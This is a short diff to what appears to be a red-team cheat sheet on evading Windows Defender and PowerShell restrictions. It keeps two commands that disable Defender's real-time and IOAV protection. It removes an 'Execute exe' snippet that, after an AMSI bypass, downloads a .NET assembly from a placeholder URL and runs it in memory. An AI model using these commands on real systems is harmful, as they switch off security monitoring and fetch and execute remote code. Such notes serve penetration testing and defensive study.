@@ -23,18 +23,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 Set-MpPreference -DisableIOAVprotection $true -Verbose
 ```
 
-### Execute exe
-
-bypass amsi and then
-
-{% code overflow="wrap" %}
-```powershell
-$data=(New-Object System.Net.WebClient).DownloadData('<URL>');
-$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
-$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
-[<Program>.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
-```
-{% endcode %}
+###
 
 ### Constrained Language
 
